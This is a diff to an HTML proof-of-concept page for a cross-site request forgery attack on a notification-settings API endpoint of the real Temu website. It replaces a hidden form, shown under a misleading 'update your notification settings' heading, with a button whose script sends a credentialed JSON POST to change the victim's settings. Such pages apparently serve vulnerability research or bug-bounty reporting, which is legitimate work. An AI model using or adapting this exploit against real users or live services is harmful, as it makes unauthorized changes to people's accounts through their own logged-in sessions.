@@ -1,13 +1,24 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h3>Click the button below to update your notification settings</h3>
+    <h3>Click to trigger JSON CSRF request</h3>
+    <button onclick="sendCSRF()">Send CSRF</button>
 
-    <form id="csrfForm" action="https://www.temu.com/api/bg-barbera-api/setting/notification/configure" method="POST" target="csrfFrame">
-      <input type="hidden" name='{"id":100,"status":1}' value="">
-      <button type="submit">Submit</button>
-    </form>
-
-    <iframe name="csrfFrame" style="display:none;"></iframe>
+    <script>
+      function sendCSRF() {
+        fetch("https://www.temu.com/api/bg-barbera-api/setting/notification/configure", {
+          method: "POST",
+          credentials: "include",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ id: 100, status: 1 })
+        }).then(res => {
+          console.log("Request sent. Status:", res.status);
+        }).catch(err => {
+          console.error("CSRF request blocked:", err);
+        });
+      }
+    </script>
   </body>
 </html>
